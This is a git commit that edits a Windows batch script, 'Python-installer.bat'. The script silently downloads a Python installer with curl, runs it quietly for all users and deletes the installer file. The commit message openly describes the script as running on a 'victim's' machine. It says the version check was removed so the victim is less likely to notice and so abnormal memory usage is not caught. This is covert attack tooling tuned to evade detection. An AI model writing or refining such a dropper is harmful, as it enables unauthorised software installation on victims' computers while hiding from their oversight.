8105a29bcf2e393a2ab5899460ac40d2b4db1f2f
OCEAN OF ANYTHING <oceanofanything@gmail.com>
2024-07-04 21:22:34 +0530

    Script to Install Python on The System
    1. Removed empty trail spaces, tabs, and lines which will slightly increase the speed of the program
    2. Removed `python --version`, Because it will only just cause more memory usage, and there might be a chance to be caught by the victim. So, it is better to make the program lightweight so that no abnormal memory usage is being caught.

--- Python-installer.bat
+++ Python-installer.bat
@@ -1,7 +1,5 @@
 @echo off
- 
 where python > nul 2>&1
- 
 if %errorlevel% == 0 (
 	echo Python is installed.
 	echo Exiting now ...
@@ -14,6 +12,5 @@ if %errorlevel% == 0 (
 	set INSTALLER_FILENAME=python-%PYTHON_VERSION%-amd64.exe
 	curl -o %INSTALLER_FILENAME% %PYTHON_URL%
 	%INSTALLER_FILENAME% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
-	python --version
 	del %INSTALLER_FILENAME%
 )
